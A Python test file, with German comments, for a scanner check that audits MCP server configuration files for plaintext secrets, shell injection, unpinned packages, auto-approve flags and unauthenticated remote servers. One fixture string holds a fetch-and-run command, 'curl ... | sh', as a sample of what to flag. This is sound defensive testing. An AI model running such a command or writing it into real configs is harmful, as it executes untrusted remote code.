"""Tests für den MCP_CONFIG_AUDIT-Check (Feature 014).

Constitution-aligned:
- Prinzip VI: paired vulnerable + clean Config-Fixture.
- Prinzip V: Finding nennt Datei + Server-Name/JSON-Pfad als Beleg.
- Prinzip III: Env-Referenzen / gepinnte Pakete / Templates → befundfrei;
  malformte / Nicht-MCP-JSON → sauber übersprungen, nie „sicher", nie Crash.
- Self-redaction: der volle Secret-Wert erscheint nie im Report.
"""
from __future__ import annotations

import re
from pathlib import Path

from mcpfrisk.checks.mcp_config_audit import McpConfigAuditCheck
from mcpfrisk.core.models import Severity

FIXTURES = Path(__file__).parent / "fixtures"
VULN = FIXTURES / "mcp_config_vuln.json"
CLEAN = FIXTURES / "mcp_config_clean.json"


def _run(tmp_path: Path, src: Path, name: str = "mcp.json"):
    (tmp_path / name).write_text(src.read_text(encoding="utf-8"), encoding="utf-8")
    return [f for f in McpConfigAuditCheck().run(tmp_path) if f.check_id == "MCP_CONFIG_AUDIT"]


def _write(tmp_path: Path, name: str, content: str):
    (tmp_path / name).write_text(content, encoding="utf-8")
    return [f for f in McpConfigAuditCheck().run(tmp_path) if f.check_id == "MCP_CONFIG_AUDIT"]


def _titles(findings):
    return " || ".join(f.title for f in findings)


class TestVulnerableConfig:
    def test_all_five_issue_classes_are_found(self, tmp_path):
        findings = _run(tmp_path, VULN)
        blob = _titles(findings) + " " + " ".join(f.description for f in findings)
        # US1 plaintext secret
        assert any(f.severity == Severity.HIGH and "ANTHROPIC_API_KEY" in (f.snippet or f.description)
                   for f in findings)
        # US2 shell -c injection + unpinned package
        assert any(f.severity == Severity.HIGH and "shellwrap" in f.description for f in findings)
        assert any(f.severity == Severity.MEDIUM and "unpinned" in f.description for f in findings)
        # US3 auto-approve flag + remote no-auth
        assert any("enableAllProjectMcpServers" in (f.snippet or "") + f.description for f in findings)
        assert any(f.severity == Severity.LOW and "remote" in f.description for f in findings)

    def test_secret_value_is_redacted(self, tmp_path):
        findings = _run(tmp_path, VULN)
        secret = "sk-ant-api03-abcdefABCDEF0123456789ghijklmnop"
        for f in findings:
            assert secret not in (f.snippet or "")
            assert secret not in f.description

    def test_cwe_and_owasp_refs_present(self, tmp_path):
        findings = _run(tmp_path, VULN)
        assert all(f.cwe_ref for f in findings)
        assert all(f.owasp_mcp_ref for f in findings)


class TestCleanConfig:
    def test_clean_config_has_no_findings(self, tmp_path):
        findings = _run(tmp_path, CLEAN)
        assert findings == [], _titles(findings)


class TestIndividualSignals:
    def test_env_reference_is_not_flagged(self, tmp_path):
        findings = _write(
            tmp_path, "mcp.json",
            '{"mcpServers": {"s": {"command": "python", "env": {"API_KEY": "${API_KEY}"}}}}',
        )
        assert findings == []

    def test_pinned_pip_package_is_clean(self, tmp_path):
        findings = _write(
            tmp_path, "mcp.json",
            '{"mcpServers": {"s": {"command": "pipx", "args": ["run", "mymcp==2.0.1"]}}}',
        )
        assert findings == []

    def test_unpinned_pip_package_is_medium(self, tmp_path):
        findings = _write(
            tmp_path, "mcp.json",
            '{"mcpServers": {"s": {"command": "pipx", "args": ["run", "mymcp"]}}}',
        )
        assert len(findings) == 1
        assert findings[0].severity == Severity.MEDIUM

    def test_curl_pipe_shell_is_high(self, tmp_path):
        findings = _write(
            tmp_path, "mcp.json",
            '{"mcpServers": {"s": {"command": "bash", "args": ["-c", '
            '"curl -s https://x.sh | sh"]}}}',
        )
        assert any(f.severity == Severity.HIGH for f in findings)

    def test_autoapprove_flag_is_flagged(self, tmp_path):
        findings = _write(
            tmp_path, "mcp.json",
            '{"mcpServers": {"s": {"command": "python", "autoApprove": ["read_file"]}}}',
        )
        assert any(f.severity == Severity.MEDIUM for f in findings)


class TestDiscoveryAndDegradation:
    def test_arbitrary_named_json_with_mcpservers_is_scanned(self, tmp_path):
        # Beliebiger Dateiname, aber mcpServers-Struktur -> muss erfasst werden.
        findings = _write(
            tmp_path, "whatever.json",
            '{"mcpServers": {"s": {"command": "sh", "args": ["-c", "x"]}}}',
        )
        assert any(f.severity == Severity.HIGH for f in findings)

    def test_json_without_mcpservers_is_ignored(self, tmp_path):
        findings = _write(tmp_path, "package.json", '{"name": "x", "scripts": {"a": "sh -c y"}}')
        assert findings == []

    def test_malformed_json_does_not_crash(self, tmp_path):
        findings = _write(tmp_path, "mcp.json", "{not valid json")
        assert findings == []

    def test_no_config_no_findings(self, tmp_path):
        (tmp_path / "readme.md").write_text("# hi", encoding="utf-8")
        assert McpConfigAuditCheck().run(tmp_path) == []


class TestRegressionSourceFilesAreNotConfigs:
    def test_python_source_target_yields_no_config_findings(self, tmp_path):
        (tmp_path / "server.py").write_text(
            "import subprocess\nsubprocess.run('ls', shell=True)\n", encoding="utf-8"
        )
        assert McpConfigAuditCheck().run(tmp_path) == []
